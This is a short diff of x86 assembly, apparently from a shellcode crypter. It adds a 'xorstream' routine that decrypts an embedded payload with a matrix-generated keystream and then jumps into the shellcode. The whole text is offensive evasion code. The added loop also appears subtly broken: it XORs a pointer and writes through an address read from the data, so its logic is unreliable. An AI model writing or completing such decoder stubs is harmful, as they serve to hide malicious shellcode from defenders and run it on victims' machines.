@@ -182,7 +182,7 @@ addmatrix:
 	push ebp
 	mov ebp, esp
 	xor ebx, ebx
-	mov ecx, 0x10
+	mov ecx, 0x10			; interact with all blocks
 		
 addmatrix_l:
 	mov eax, [matrixv+ebx]
@@ -193,6 +193,27 @@ addmatrix_l:
 	add ebx, 0x04
 	loop addmatrix_l
 
+	leave
+	ret
+
+xorstream:
+	push ebp
+	mov ebp, esp
+	xor ebx, ebx
+	mov ecx, 0x8e		; payload size
+	
+xorstream_l:
+	mov esi, [matrixm+ebx]
+	lea edi, [esp+0x8]	; ciphertext (payload location)
+	add edi, ebx
+	mov eax, [edi]		; dword location
+
+	xor edi, esi		; xor ciphertext with keystream
+	mov [eax], edi		; restore word location
+
+	add ebx, 0x4		; 0x04 dword size
+	loop xorstream_l
+		
 	leave
 	ret
 
@@ -220,6 +241,8 @@ block:
 	pop ecx
 	dec ecx
 	jnz block
+
+	call xorstream
 	
 	jmp shellcode
 payload:
